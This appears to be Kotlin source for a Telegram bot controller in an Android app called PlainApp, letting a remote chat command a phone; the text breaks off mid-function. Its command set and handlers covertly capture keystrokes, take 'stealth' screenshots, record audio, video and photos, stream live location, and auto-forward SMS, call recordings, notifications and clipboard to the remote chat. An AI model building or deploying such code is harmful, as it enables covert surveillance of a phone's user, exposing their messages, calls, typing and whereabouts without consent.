package com.ismartcoding.plain.telegram

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CameraMetadata
import android.hardware.camera2.CaptureRequest
import android.graphics.ImageFormat
import android.media.ImageReader
import android.graphics.Bitmap
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.Looper
import android.provider.CallLog
import com.ismartcoding.lib.helpers.CoroutinesHelper.coIO
import com.ismartcoding.lib.logcat.LogCat
import com.ismartcoding.plain.MainApp
import com.ismartcoding.plain.data.DCall
import com.ismartcoding.plain.data.DContact
import com.ismartcoding.plain.data.DNotification
import com.ismartcoding.plain.features.PackageHelper
import com.ismartcoding.plain.features.NoteHelper
import com.ismartcoding.plain.features.BookmarkHelper
import com.ismartcoding.plain.features.feed.FeedHelper
import com.ismartcoding.plain.features.feed.FeedEntryHelper
import com.ismartcoding.plain.features.AudioPlayer
import com.ismartcoding.plain.features.call.BlockedNumberHelper
import com.ismartcoding.plain.features.call.SimHelper
import com.ismartcoding.plain.features.file.FileSortBy
import com.ismartcoding.plain.features.file.FileSystemHelper
import com.ismartcoding.plain.preferences.AudioPlayingPreference
import com.ismartcoding.plain.features.media.CallMediaStoreHelper
import com.ismartcoding.plain.features.media.ContactMediaStoreHelper
import com.ismartcoding.plain.features.media.AudioMediaStoreHelper
import com.ismartcoding.plain.features.media.VideoMediaStoreHelper
import com.ismartcoding.plain.features.media.ImageMediaStoreHelper
import com.ismartcoding.plain.features.sms.SmsConversationHelper
import com.ismartcoding.plain.features.sms.SmsHelper
import com.ismartcoding.plain.helpers.AppLauncherHelper
import com.ismartcoding.plain.helpers.BatteryHistoryHelper
import com.ismartcoding.plain.helpers.BluetoothControlHelper
import com.ismartcoding.plain.helpers.CallRecorderHelper
import com.ismartcoding.plain.helpers.DeviceAdminGuard
import com.ismartcoding.plain.helpers.GeofencingHelper
import com.ismartcoding.plain.helpers.AutomationHelper
import com.ismartcoding.plain.helpers.KeystrokeLogHelper
import com.ismartcoding.plain.helpers.LocationTrackingHelper
import com.ismartcoding.plain.helpers.NetworkUsageHelper
import com.ismartcoding.plain.helpers.PhoneHelper
import com.ismartcoding.plain.helpers.StealthScreenshotCapturer
import com.ismartcoding.plain.helpers.StealthScreenshotHelper
import com.ismartcoding.plain.helpers.UtilitiesHelper
import com.ismartcoding.plain.helpers.WifiControlHelper
import com.ismartcoding.plain.helpers.FileHashHelper
import com.ismartcoding.plain.helpers.QrCodeGenerateHelper
import com.ismartcoding.plain.helpers.RootHelper
import com.ismartcoding.plain.helpers.SoundMeterHelper
import com.ismartcoding.plain.features.contact.GroupHelper
import com.ismartcoding.plain.features.media.DocsHelper
import com.ismartcoding.plain.services.TimelineHelper
import com.ismartcoding.plain.events.HttpApiEvents
import com.ismartcoding.lib.channel.sendEvent
import com.ismartcoding.plain.preferences.PomodoroSettingsPreference
import com.ismartcoding.plain.preferences.TelegramBotForwardSmsPreference
import com.ismartcoding.plain.preferences.TelegramBotForwardGeofencePreference
import com.ismartcoding.plain.preferences.TelegramBotForwardBatteryAlertPreference
import com.ismartcoding.plain.preferences.TelegramBotBatteryAlertThresholdPreference
import com.ismartcoding.plain.preferences.TelegramBotForwardStealthShotsPreference
import com.ismartcoding.plain.helpers.SensorHelper
import com.ismartcoding.plain.helpers.SystemControlHelper
import com.ismartcoding.plain.helpers.GeofencingHelper
import com.ismartcoding.plain.helpers.StealthScreenshotCapturer
import com.ismartcoding.plain.features.Permission
import com.ismartcoding.plain.services.AppBlockHelper
import com.ismartcoding.plain.services.LiveCallTracker
import com.ismartcoding.plain.services.LocateRingService
import com.ismartcoding.plain.services.MessageOverlayService
import com.ismartcoding.plain.services.NotificationLogHelper
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withContext
import kotlinx.datetime.toLocalDateTime
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import kotlin.coroutines.resume
import kotlin.math.min

object TelegramBotManager {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var pollJob: Job? = null
    private var heartbeatJob: Job? = null

    @Volatile var token: String = ""
    @Volatile var chatId: String = ""
    @Volatile var isRunning: Boolean = false
    @Volatile var forwardNotifications: Boolean = true
    @Volatile var forwardCalls: Boolean = true
    @Volatile var forwardSmsEnabled: Boolean = false
    @Volatile var forwardGeofenceEnabled: Boolean = false
    @Volatile var forwardBatteryAlertEnabled: Boolean = false
    @Volatile var batteryAlertThreshold: Int = 20
    @Volatile var forwardStealthShotsEnabled: Boolean = false
    @Volatile private var lastBatteryAlertLevel: Int = -1
    @Volatile private var lastUpdateId: Long = 0L
    @Volatile private var lastForwardedCallState: String = "idle"

    private val ts get() = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())

    private val allCommands = listOf(
        "start" to "👋 Welcome & device status",
        "help" to "📖 Help & all commands",
        "messages" to "💬 SMS conversations — tap one to open",
        "sms" to "📨 Open a thread — /sms <thread_id>",
        "sendsms" to "📤 Send SMS — /sendsms <number> <text>",
        "calls" to "📞 Recent call log",
        "recordings" to "🎙️ Call recordings — tap to download",
        "contacts" to "👥 Browse contacts — tap to call, SMS, or share",
        "find" to "🔍 Reverse-lookup a phone number — /find <number>",
        "notifications" to "🔔 Recent notifications",
        "mutenotifs" to "🔕 Mute / unmute auto-forwarded notifications — /mutenotifs [on|off]",
        "logs" to "📋 Notification log history",
        "files" to "📁 Browse storage — tap folders to open, files to download",
        "screenshot" to "📸 Take a screenshot",
        "photo" to "📷 Camera photo — /photo [front|back]",
        "audio" to "🎙 Record audio — interactive duration picker",
        "video" to "🎬 Record video — pick camera, then duration",
        "apps" to "📱 List installed apps",
        "blockapp" to "🚫 Block an app — interactive picker",
        "unblockapp" to "✅ Unblock an app — interactive picker",
        "blockedapps" to "📵 Show all blocked & limited apps",
        "location" to "📍 Current GPS location",
        "battery" to "🔋 Battery status",
        "device" to "📲 Device information",
        "track" to "🛰 Tracking hub overview",
        "livelocation" to "🗺 Live location stream — /livelocation [n]",
        "tracklocation" to "🧭 Recent location points — /tracklocation [n]",
        "keystrokes" to "⌨️ Captured keystrokes — /keystrokes [n]",
        "keytop" to "📊 Top apps by keystroke count",
        "shots" to "🖼 Recent stealth screenshots — /shots [n]",
        "permissions" to "🛡 Status of every app permission",
        "automations" to "⚙️ List automation rules",
        "newrule" to "➕ Create a manual rule — /newrule <name> <action> <args>",
        "newschedule" to "📅 Create a daily schedule — /newschedule HH:MM <name> <action> <args>",
        "delrule" to "🗑 Delete a rule — /delrule <id>",
        "runrule" to "▶️ Run an automation — /runrule <id>",
        "togglerule" to "🔁 Enable/disable a rule — /togglerule <id>",
        "notes" to "📝 Browse notes — /notes [search]",
        "addnote" to "➕ Create a new note (interactive)",
        "bookmarks" to "🔖 Browse bookmarks — /bookmarks [search]",
        "addbookmark" to "🔗 Add a bookmark — /addbookmark <url>",
        "feeds" to "📡 RSS feeds — tap to view recent entries",
        "feedentries" to "📰 Recent feed entries — /feedentries [search]",
        "music" to "🎵 Music library — tap to download",
        "videos" to "🎞 Video library — tap to download",
        "images" to "🖼 Image gallery — tap to send",
        "pomodoro" to "🍅 Pomodoro — start/pause/stop/status",
        "torch" to "🔦 Flashlight — /torch [on|off]",
        "speak" to "🗣 Text-to-speech — /speak <text>",
        "stopspeak" to "🤫 Stop the device speaking right now",
        "vibrate" to "📳 Vibrate device — /vibrate [seconds]",
        "toast" to "💬 Quick toast pop-up on device — /toast <text>",
        "findphone" to "🚨 Locate phone with alarm — /findphone [on|off]",
        "show" to "💡 Show banner on device — /show <text>",
        "wake" to "📺 Wake screen — /wake [seconds]",
        "brightness" to "🔆 Screen brightness — /brightness [0-100]",
        "volume" to "🔊 Volume — /volume [stream] [0-100]",
        "launch" to "🚀 Launch any app — /launch <pkg|name>",
        "datasettings" to "📡 Open mobile-data settings page on device",
        "bedtime" to "🌙 View / set the parental bedtime window",
        "launches" to "🚀 Recent app launches — /launches [n]",
        "livecall" to "📞 Live call hub — accept / mute / end ongoing calls",
        "wifi" to "📶 Wi-Fi state / toggle — /wifi [on|off]",
        "netusage" to "📊 Network usage — /netusage [days]",
        "storage" to "💾 Storage usage — internal, SD card, USB",
        "sim" to "📡 SIM card & carrier info",
        "dnd" to "🔇 Do Not Disturb — /dnd [on|off|toggle]",
        "screentime" to "⏱ App screen time — /screentime [days]",
        "blocknumber" to "🚫 Block/unblock incoming calls — /blocknumber [number]",
        "nowplaying" to "🎵 Now-playing status + playback controls",
        "forwardsms" to "📩 Toggle auto-forwarding of incoming SMS to this chat",
        "clipboard" to "📋 Read or set device clipboard — /clipboard [text to set]",
        "mobiledata" to "📡 Mobile data — show status and toggle on/off",
        "bluetooth" to "🔵 Bluetooth devices & control — /bluetooth [on|off]",
        "lockscreen" to "🔒 Lock the device screen instantly",
        "forwardphotos" to "📷 Auto-forward new camera photos — /forwardphotos [on|off]",
        "airplane" to "✈️ Airplane mode toggle — /airplane [on|off]",
        "schedulesms" to "⏰ Schedule an SMS — /schedulesms <number> <delay_sec> <text>",
        "batteryhistory" to "🔋 Battery drain chart — /batteryhistory [hours]",
        "vpn" to "🔐 VPN connection status",
        "clearcache" to "🗑 Clear an app's cache — interactive picker",
        "geofence" to "🗺 Geofence zones — list, add, delete, view events",
        "addcontact" to "➕ Add a new contact — interactive",
        "deletecontact" to "🗑 Delete a contact by name or number",
        "editnote" to "✏️ Edit an existing note — interactive",
        "forwardclipboard" to "📋 Auto-forward clipboard changes to chat — /forwardclipboard [on|off]",
        "soundmeter" to "🎙 Ambient sound level — /soundmeter [seconds]",
        "qrcode" to "📷 Generate QR code image — /qrcode <text or URL>",
        "docs" to "📄 Document library (PDF, DOCX, etc.) — /docs [search]",
        "filehash" to "#️⃣ File hash (SHA-256 + MD5) — /filehash <path>",
        "wifiscan" to "📡 Scan nearby Wi-Fi networks",
        "timeline" to "📋 Device activity timeline — /timeline [n]",
        "contactgroups" to "👥 Contact groups — list and view members",
        "callnow" to "📞 Initiate outgoing call — /callnow <number>",
        "deletefile" to "🗑 Delete a file from device — /deletefile <path>",
        "networkinfo" to "🌐 Extended network & Wi-Fi details",
        "reboot" to "🔄 Reboot device (requires root or Device Admin)",
        "mms" to "💬 Browse MMS multimedia messages — /mms [n]",
        "gyroscope" to "🌀 Live gyroscope rotation rate (rad/s)",
        "compass" to "🧭 Magnetic compass heading & cardinal direction",
        "barometer" to "🌡 Atmospheric pressure (hPa) and altitude (m)",
        "steps" to "👟 Step count since last reboot + today estimate",
        "proximity" to "📡 Proximity sensor — near or far",
        "hotspot" to "📶 Mobile hotspot status / toggle — /hotspot [on|off]",
        "setalarm" to "⏰ Set a system alarm — /setalarm HH:MM [label]",
        "batteryalert" to "🔋 Low-battery auto-alert — /batteryalert [on|off] [threshold%]",
        "forwardgeofence" to "🗺 Auto-forward geofence enter/exit alerts — /forwardgeofence [on|off]",
        "forwardshots" to "📸 Auto-forward stealth screenshots to chat — /forwardshots [on|off]",
        "commands" to "📝 List all commands with details",
        "stop" to "⛔ Stop the bot",
    )

    fun start(newToken: String, newChatId: String) {
        if (newToken.isBlank() || newChatId.isBlank()) return
        token = newToken
        chatId = newChatId
        if (isRunning) return
        isRunning = true
        launchPollJob(greet = true)
        heartbeatJob?.cancel()
        heartbeatJob = scope.launch {
            while (isRunning) {
                delay(30_000)
                if (isRunning && pollJob?.isActive != true) {
                    LogCat.w("TelegramBot: poll job died — restarting")
                    launchPollJob(greet = false)
                }
            }
        }
        LogCat.d("TelegramBotManager started")
    }

    private fun launchPollJob(greet: Boolean) {
        pollJob?.cancel()
        pollJob = scope.launch {
            if (greet) {
                registerCommands()
                sendMessage("🟢 <b>PlainApp Bot started</b> — ${ts}\n📱 <i>${PhoneHelper.getDeviceName(MainApp.instance)}</i>\n\nType /help for all commands.")
            }
            poll()
        }
    }

    fun stop() {
        isRunning = false
        lastForwardedCallState = "idle"
        heartbeatJob?.cancel()
        heartbeatJob = null
        pollJob?.cancel()
        pollJob = null
        LogCat.d("TelegramBotManager stopped")
    }

    fun sendMessage(text: String, replyMarkup: JSONObject? = null) {
        if (token.isBlank() || chatId.isBlank()) return
        scope.launch {
            TelegramApiClient.sendMessage(token, chatId, text, replyMarkup = replyMarkup)
        }
    }

    fun forwardNotification(n: DNotification) {
        if (!isRunning || !forwardNotifications) return
        val txt = buildString {
            append("🔔 <b>New notification</b>\n")
            append("📱 <code>${htmlEsc(n.appName)}</code>\n")
            if (!n.title.isNullOrBlank()) append("📌 <b>${htmlEsc(n.title)}</b>\n")
            if (!n.body.isNullOrBlank()) append("💬 ${htmlEsc(n.body)}\n")
            append("🕐 <i>${ts}</i>")
        }
        sendMessage(txt)
    }

    fun forwardCallState(state: String, display: String, source: String, direction: String) {
        if (!isRunning || !forwardCalls) return
        if (state == lastForwardedCallState) return
        lastForwardedCallState = state
        val emoji = when (state) {
            "ringing" -> if (direction == "incoming") "📲" else "📞"
            "active" -> "✅"
            "ended" -> "🔴"
            else -> return
        }
        val stateLabel = when (state) {
            "ringing" -> if (direction == "incoming") "Incoming call" else "Outgoing call"
            "active" -> "Call connected"
            "ended" -> "Call ended"
            else -> return
        }
        val txt = buildString {
            append("$emoji <b>$stateLabel</b>\n")
            if (display.isNotBlank()) {
                val contactName = lookupContactName(display)
                if (contactName.isNotBlank()) {
                    append("👤 <b>${htmlEsc(contactName)}</b>\n")
                    append("📱 <code>${htmlEsc(display)}</code>\n")
                } else {
                    append("📱 <code>${htmlEsc(display)}</code>\n")
                }
            }
            if (source != "phone") append("📡 via <i>${htmlEsc(source)}</i>\n")
            append("🕐 <i>${ts}</i>")
        }
        sendMessage(txt)
    }

    fun forwardCallRecording(file: File, meta: CallRecorderHelper.Meta) {
        if (!isRunning || token.isBlank() || chatId.isBlank()) return
        scope.launch {
            try {
                val durSec = (meta.durationMs / 1000).toInt().coerceAtLeast(1)
                val dirEmoji = if (meta.direction == "incoming") "📲" else "📞"
                val dur = formatDuration(meta.durationMs)
                // Look up contact name from the phone number stored in meta.displayName
                val contactName = lookupContactName(meta.displayName)
                val caption = buildString {
                    append("$dirEmoji <b>Call Recording</b>\n")
                    if (contactName.isNotBlank()) {
                        append("👤 <b>${htmlEsc(contactName)}</b>\n")
                        if (meta.displayName.isNotBlank()) append("📱 <code>${htmlEsc(meta.displayName)}</code>\n")
                    } else if (meta.displayName.isNotBlank()) {
                        append("👤 <b>${htmlEsc(meta.displayName)}</b>\n")
                    }
                    append("📡 ${htmlEsc(meta.source.ifBlank { meta.appName })}")
                    if (meta.appName.isNotBlank() && meta.appName != meta.source) append(" · ${htmlEsc(meta.appName)}")
                    append("\n")
                    append("⏱ <i>$dur</i>  📦 ${meta.sizeBytes / 1024} KB\n")
                    append("🕐 <i>${ts}</i>")
                }
                TelegramApiClient.sendAudio(token, chatId, file, caption, durSec)
            } catch (e: Exception) {
                LogCat.e("TelegramBot forwardCallRecording failed: ${e.message}")
            }
        }
    }

    /** Called by SmsForwardReceiver when an SMS arrives and forwardSmsEnabled == true. */
    fun forwardSms(sender: String, body: String) {
        if (!isRunning || !forwardSmsEnabled || token.isBlank() || chatId.isBlank()) return
        scope.launch {
            val contactName = lookupContactName(sender)
            val sb = StringBuilder("📩 <b>Incoming SMS</b>\n")
            if (contactName.isNotBlank()) sb.append("👤 <b>${htmlEsc(contactName)}</b>\n")
            sb.append("📱 <code>${htmlEsc(sender)}</code>\n")
            sb.append("🕐 $ts\n\n")
            sb.append(htmlEsc(body))
            try { TelegramApiClient.sendMessage(token, chatId, sb.toString()) }
            catch (e: Exception) { LogCat.e("TelegramBot forwardSms failed: ${e.message}") }
        }
    }

    fun sendCrashReport(throwable: Throwable, timestamp: String) {
        val t = token
        val c = chatId
        if (t.isBlank() || c.isBlank()) return
        try {
            val sw = java.io.StringWriter()
            throwable.printStackTrace(java.io.PrintWriter(sw))
            val stackTrace = sw.toString()
            val appVersion = try { MainApp.getAppVersion() } catch (_: Throwable) { "?" }
            val msg = buildString {
                append("🚨 <b>PlainApp Crashed!</b>\n")
                append("⏰ <code>$timestamp</code>\n")
                append("📱 <code>${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}</code>\n")
                append("🤖 Android <code>${android.os.Build.VERSION.RELEASE}</code>  App <code>$appVersion</code>\n\n")
                val lines = stackTrace.lines()
                val preview = lines.take(20).joinToString("\n")
                append("<pre>${htmlEsc(preview)}</pre>")
                if (lines.size > 20) append("\n<i>…${lines.size - 20} more lines (see crash_report.txt)</i>")
            }
            TelegramApiClient.sendMessage(t, c, msg.take(4096))
        } catch (_: Throwable) {}
    }

    private fun formatDuration(ms: Long): String {
        val totalSec = ms / 1000
        val h = totalSec / 3600
        val m = (totalSec % 3600) / 60
        val s = totalSec % 60
        return if (h > 0) "%d:%02d:%02d".format(h, m, s) else "%d:%02d".format(m, s)
    }

    private suspend fun poll() {
        while (isRunning) {
            try {
                val result = withContext(Dispatchers.IO) {
                    TelegramApiClient.getUpdates(token, lastUpdateId + 1, 25)
                }
                if (result == null) { delay(5000); continue }
                if (!result.optBoolean("ok", false)) { delay(5000); continue }
                val updates = result.optJSONArray("result") ?: continue
                for (i in 0 until updates.length()) {
                    val update = updates.getJSONObject(i)
                    val updateId = update.optLong("update_id", 0L)
                    if (updateId > lastUpdateId) lastUpdateId = updateId
                    handleUpdate(update)
                }
            } catch (e: CancellationException) {
                break
            } catch (e: Exception) {
                LogCat.e("TelegramBot poll error: ${e.message}")
                delay(5000)
            }
        }
    }

    private suspend fun handleUpdate(update: JSONObject) {
        update.optJSONObject("callback_query")?.let { cq ->
            handleCallback(cq)
            return
        }
        val msg = update.optJSONObject("message") ?: return
        val fromChatId = msg.optJSONObject("chat")?.optLong("id")?.toString() ?: return
        if (fromChatId != chatId) {
            TelegramApiClient.sendMessage(token, fromChatId, "⛔ Unauthorized. This bot is private.")
            return
        }
        val text = msg.optString("text", "").trim()
        if (text.isEmpty()) return

        // If we're waiting for a free-form reply (e.g. "type custom duration"), consume it
        // unless the user explicitly sends a new command.
        val pi = pendingInput
        if (pi != null && !text.startsWith("/")) {
            pendingInput = null
            scope.launch { consumePendingInput(pi, text) }
            return
        }
        // Sending any /command cancels a pending input.
        if (text.startsWith("/")) pendingInput = null

        val parts = text.split(" ")
        val command = parts[0].lowercase().trimStart('/')
            .substringBefore("@")
        val args = parts.drop(1)
        scope.launch {
            try {
                when (command) {
                    "start" -> cmdStart()
                    "help" -> cmdHelp()
                    "messages" -> cmdMessages(args)
                    "sms" -> cmdSmsThread(args)
                    "sendsms" -> cmdSendSms(args)
                    "calls" -> cmdCalls(args)
                    "recordings" -> cmdRecordings(args)
                    "contacts" -> cmdContacts(args)
                    "find", "findcontact", "lookup", "whois" -> cmdFind(args)
                    "notifications" -> cmdNotifications(args)
                    "mutenotifs", "mutenotif", "mutenotifications", "shutup", "silence" -> cmdMuteNotifs(args)
                    "logs" -> cmdLogs(args)
                    "files" -> cmdFiles(args)
                    "screenshot" -> cmdScreenshot()
                    "photo" -> cmdPhoto(args)
                    "audio" -> cmdAudio(args)
                    "video" -> cmdVideo(args)
                    "apps" -> cmdApps(args)
                    "blockapp" -> cmdBlockApp(args)
                    "unblockapp" -> cmdUnblockApp(args)
                    "blockedapps" -> cmdBlockedApps()
                    "location" -> cmdLocation()
                    "battery" -> cmdBattery()
                    "device" -> cmdDevice()
                    "track" -> cmdTrackHub()
                    "livelocation", "live" -> cmdLiveLocation(args)
                    "tracklocation", "trackloc" -> cmdTrackLocation(args)
                    "keystrokes", "keys" -> cmdKeystrokes(args)
                    "keytop" -> cmdKeyTop()
                    "shots", "screenshots" -> cmdShots(args)
                    "permissions", "perms" -> cmdPermissions()
                    "automations", "rules" -> cmdAutomations()
                    "newrule", "addrule" -> cmdNewRule(args)
                    "newschedule", "addschedule" -> cmdNewSchedule(args)
                    "delrule", "deleterule" -> cmdDelRule(args)
                    "runrule" -> cmdRunRule(args)
                    "togglerule" -> cmdToggleRule(args)
                    "notes" -> cmdNotes(args)
                    "addnote" -> cmdAddNote()
                    "bookmarks" -> cmdBookmarks(args)
                    "addbookmark" -> cmdAddBookmark(args)
                    "feeds" -> cmdFeeds()
                    "feedentries", "feedentry" -> cmdFeedEntries(args)
                    "music", "audios" -> cmdMusic(args)
                    "videos", "vidlib" -> cmdVideoLibrary(args)
                    "images", "gallery" -> cmdImages(args)
                    "pomodoro", "pom" -> cmdPomodoro(args)
                    "torch", "flashlight" -> cmdTorch(args)
                    "speak", "tts" -> cmdSpeak(text.removePrefix(parts[0]).trim())
                    "stopspeak", "shutup", "ttsstop" -> cmdStopSpeak()
                    "vibrate" -> cmdVibrate(args)
                    "toast" -> cmdToast(text.removePrefix(parts[0]).trim())
                    "findphone", "ringphone" -> cmdFindPhone(args)
                    "show", "banner" -> cmdShow(text.removePrefix(parts[0]).trim())
                    "wake", "wakescreen" -> cmdWake(args)
                    "brightness", "bright" -> cmdBrightness(args)
                    "volume", "vol" -> cmdVolume(args)
                    "launch", "open" -> cmdLaunch(args)
                    "datasettings" -> cmdDataSettings()
                    "bedtime" -> cmdBedtime(args)
                    "launches", "launchhistory" -> cmdLaunches(args)
                    "livecall", "calltracker" -> cmdLiveCall()
                    "wifi" -> cmdWifi(args)
                    "netusage", "datausage" -> cmdNetUsage(args)
                    "storage", "disk" -> cmdStorage()
                    "sim", "siminfo", "carrier" -> cmdSim()
                    "dnd", "donotdisturb" -> cmdDnd(args)
                    "screentime", "usagestats", "usage" -> cmdScreenTime(args)
                    "blocknumber", "blocknum", "blockcall" -> cmdBlockNumber(args)
                    "nowplaying", "np", "player" -> cmdNowPlaying()
                    "forwardsms", "smsfwd" -> cmdForwardSms(args)
                    "clipboard", "clip" -> cmdClipboard(text.removePrefix(parts[0]).trim())
                    "mobiledata", "mobile", "data" -> cmdMobileData(args)
                    "bluetooth", "bt" -> cmdBluetooth(args)
                    "lockscreen", "lock" -> cmdLockScreen()
                    "forwardphotos", "autophotos", "photofwd" -> cmdForwardPhotos(args)
                    "airplane", "airplanemode", "aeroplane" -> cmdAirplane(args)
                    "schedulesms", "schedsms" -> cmdScheduleSms(args)
                    "batteryhistory", "bathistory", "bathist" -> cmdBatteryHistory(args)
                    "vpn" -> cmdVpn()
                    "clearcache", "cacheclean" -> cmdClearCache(args)
                    "geofence", "gf", "geofences" -> cmdGeofence(args)
                    "addcontact", "newcontact" -> cmdAddContact()
                    "deletecontact", "delcontact", "rmcontact" -> cmdDeleteContact(args)
                    "editnote" -> cmdEditNote(args)
                    "forwardclipboard", "clipfwd", "clipmon" -> cmdForwardClipboard(args)
                    "soundmeter", "sound", "noise", "dblevel" -> cmdSoundMeter(args)
                    "qrcode", "qr" -> cmdQrCode(text.removePrefix(parts[0]).trim())
                    "docs", "documents", "document" -> cmdDocs(args)
                    "filehash", "hash", "sha256" -> cmdFileHash(args)
                    "wifiscan", "wifilist", "scanwifi" -> cmdWifiScan()
                    "timeline", "activity" -> cmdTimeline(args)
                    "contactgroups", "groups", "cgroups" -> cmdContactGroups()
                    "callnow", "dial", "makecall" -> cmdCallNow(args)
                    "deletefile", "delfile", "rmfile" -> cmdDeleteFile(args)
                    "networkinfo", "netinfo", "wifiinfo" -> cmdNetworkInfo()
                    "reboot", "restart", "rebootdevice" -> cmdReboot()
                    "mms" -> cmdMms(args)
                    "gyroscope", "gyro", "rotation" -> cmdGyroscope()
                    "compass", "heading", "magnetic" -> cmdCompass()
                    "barometer", "pressure", "altitude", "baro" -> cmdBarometer()
                    "steps", "pedometer", "stepcount", "stepcounter" -> cmdSteps()
                    "proximity", "prox", "proxsensor" -> cmdProximity()
                    "hotspot", "tethering", "wifiap" -> cmdHotspot(args)
                    "setalarm", "alarm", "addalarm" -> cmdSetAlarm(args)
                    "batteryalert", "batalert", "lowbattery" -> cmdBatteryAlert(args)
                    "forwardgeofence", "geofencefwd", "gffwd" -> cmdForwardGeofence(args)
                    "forwardshots", "shotsfwd", "autoshare" -> cmdForwardShots(args)
                    "commands" -> cmdCommands()
                    "stop" -> { sendMessage("⛔ Bot stopped. Restart it from the PlainApp settings."); stop() }
                    else -> sendMessage("❓ Unknown command: <code>$command</code>\n\nSend /help for all commands.")
                }
            } catch (e: Exception) {
                LogCat.e("TelegramBot cmd $command error: ${e.message}")
                sendMessage("❌ Error running /$command: ${htmlEsc(e.message ?: "unknown")}")
            }
        }
    }

    private suspend fun handleCallback(cq: JSONObject) {
        val cqId = cq.optString("id", "")
        val fromChatId = cq.optJSONObject("message")?.optJSONObject("chat")?.optLong("id")?.toString()
        if (fromChatId != chatId) {
            if (cqId.isNotEmpty()) TelegramApiClient.answerCallbackQuery(token, cqId, "⛔ Unauthorized", true)
            return
        }
        val messageId = cq.optJSONObject("message")?.optLong("message_id", 0L) ?: 0L
        val data = cq.optString("data", "")
        if (data.isEmpty()) { if (cqId.isNotEmpty()) TelegramApiClient.answerCallbackQuery(token, cqId); return }

        val colon = data.indexOf(':')
        val key = if (colon < 0) data else data.substring(0, colon)
        val rest = if (colon < 0) "" else data.substring(colon + 1)

        scope.launch {
            try {
                when (key) {
                    "sms_open" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Loading thread…")
                        renderSmsThreadPage(rest.filter { it.isDigit() }, offset = 0, editMessageId = null)
                    }
                    "sms_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val sep = rest.lastIndexOf(':')
                        if (sep < 0) return@launch
                        val tid = rest.substring(0, sep).filter { it.isDigit() }
                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
                        renderSmsThreadPage(tid, off, editMessageId = messageId)
                    }
                    "calls_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        // Format: "calls_pg:<query>:<offset>" where query can be "_" for all
                        val sep = rest.lastIndexOf(':')
                        val q: String
                        val off: Int
                        if (sep >= 0) {
                            q = rest.substring(0, sep).let { if (it == "_") "" else it }
                            off = rest.substring(sep + 1).toIntOrNull() ?: 0
                        } else {
                            q = ""
                            off = rest.toIntOrNull() ?: 0
                        }
                        renderCallsPage(q, off, editMessageId = messageId)
                    }
                    "calls_q" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Send search text…")
                        pendingInput = "calls_search"
                        sendMessage("🔍 Send a name or number to search call logs (e.g. <code>John</code> or <code>+1555</code>), or <code>*</code> to clear.")
                    }
                    "messages_q" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Send search text…")
                        pendingInput = "messages_search"
                        sendMessage("🔍 Send a contact name or number to search SMS conversations, or <code>*</code> to clear.")
                    }
                    "messages_refresh" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        renderMessagesPage(lastMessagesQuery, editMessageId = messageId)
                    }
                    "contacts_q" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Send search text…")
                        pendingInput = "contacts_search"
                        sendMessage("🔍 Send a name, phone, or email to search contacts, or <code>*</code> to clear.")
                    }
                    "notif_q" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Send search text…")
                        pendingInput = "notif_search"
                        sendMessage("🔍 Send an app name or keyword to search notifications, or <code>*</code> to clear.")
                    }
                    "notif_refresh" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        renderNotificationsPage(lastNotifQuery, editMessageId = messageId)
                    }
                    "files_q" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Send search text…")
                        pendingInput = "files_search:$rest"
                        sendMessage("🔍 Send a filename or pattern to search this folder and all subfolders (e.g. <code>.pdf</code> or <code>photo</code>).")
                    }
                    "blockapp_q" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Send search text…")
                        pendingInput = "blockapp_search"
                        sendMessage("🔍 Send an app name to search (e.g. <code>chrome</code>), or <code>*</code> to clear.")
                    }
                    "c_calls" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Loading call history…")
                        renderContactCallsPage(rest, offset = 0, editMessageId = messageId)
                    }
                    "c_calls_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val sep = rest.lastIndexOf(':')
                        if (sep < 0) return@launch
                        val rawId = rest.substring(0, sep)
                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
                        renderContactCallsPage(rawId, off, editMessageId = messageId)
                    }
                    "aud" -> {
                        if (rest == "custom") {
                            TelegramApiClient.answerCallbackQuery(token, cqId)
                            pendingInput = "audio_duration"
                            TelegramApiClient.editMessageText(
                                token, chatId, messageId,
                                "🎙 <b>Custom audio duration</b>\n\nReply with the number of <b>seconds</b> to record (1–300).\n\nFormat: just the number, e.g. <code>45</code>.\nSend any /command to cancel."
                            )
                        } else {
                            val n = rest.toIntOrNull()?.coerceIn(1, 300) ?: 10
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Recording ${n}s…")
                            TelegramApiClient.editMessageText(token, chatId, messageId, "🎙 Recording <b>${n}s</b> of audio…")
                            runAudioRecording(n)
                        }
                    }
                    "vid_cam" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        showVideoDurationMenu(useFront = rest == "front", editMessageId = messageId)
                    }
                    "vid_cam_pick" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
